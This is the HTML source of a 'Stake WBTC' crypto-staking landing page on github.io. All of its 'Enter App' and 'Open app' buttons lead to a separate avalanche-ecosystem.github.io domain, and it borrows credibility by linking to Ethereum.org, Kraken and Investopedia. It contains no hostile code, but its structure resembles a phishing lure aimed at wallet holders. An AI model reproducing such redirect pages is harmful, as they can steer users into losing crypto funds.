<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Stake WBTC</title>
  <meta name="description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
  <link rel="canonical" href="https://stake-wbtc.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F4EE">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Stake WBTC">
  <meta property="og:description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
  <meta property="og:url" content="https://stake-wbtc.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Stake WBTC">
  <meta name="twitter:description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://stake-wbtc.github.io/#website",
        "url": "https://stake-wbtc.github.io/",
        "name": "Stake WBTC",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://stake-wbtc.github.io/#organization",
        "name": "Stake WBTC",
        "url": "https://stake-wbtc.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://stake-wbtc.github.io/#app",
        "name": "Stake WBTC",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://stake-wbtc.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Stake WBTC">
      <img src="stakecrypto.png" width="30" height="30" alt="">
      <span>Stake WBTC</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
      <a href="https://www.kraken.com/learn/what-is-crypto-staking" target="_blank" rel="nofollow noopener noreferrer">Kraken learn</a>
      <a href="https://www.investopedia.com/how-to-stake-ethereum-7482623" target="_blank" rel="nofollow noopener noreferrer">Staking risks</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Stake WBTC</h1>
      <p class="sub"><strong>Stake WBTC</strong> locks your wrapped bitcoin to earn staking rewards from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Stake selector">
      <div class="card-head">
        <img src="stakecrypto.png" width="42" height="42" alt="">
        <div>
          <span class="eyebrow">Choose an asset to stake</span>
          <p class="card-title">Self-custody staking entry</p>
        </div>
      </div>

      <div class="asset-row" role="group" aria-label="Choose an asset to stake">
        <button class="asset is-active" type="button" aria-pressed="true">
          <img src="eth.png" width="28" height="28" alt="">
          <span>WBTC</span>
        </button>
        <button class="asset" type="button" aria-pressed="false">
          <img src="usdt.png" width="28" height="28" alt="">
          <span>USDT</span>
        </button>
        <button class="asset" type="button" aria-pressed="false">
          <img src="sol.png" width="28" height="28" alt="">
          <span>SOL</span>
        </button>
      </div>

      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
    </section>
  </main>

  <footer class="foot">Stake WBTC &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var assets = document.querySelectorAll(".asset");
    for (var i = 0; i < assets.length; i += 1) {
      assets[i].addEventListener("click", function(){
        for (var j = 0; j < assets.length; j += 1) {
          assets[j].classList.remove("is-active");
          assets[j].setAttribute("aria-pressed", "false");
        }
        this.classList.add("is-active");
        this.setAttribute("aria-pressed", "true");
      });
    }
  })();
  </script>
</body>
</html>
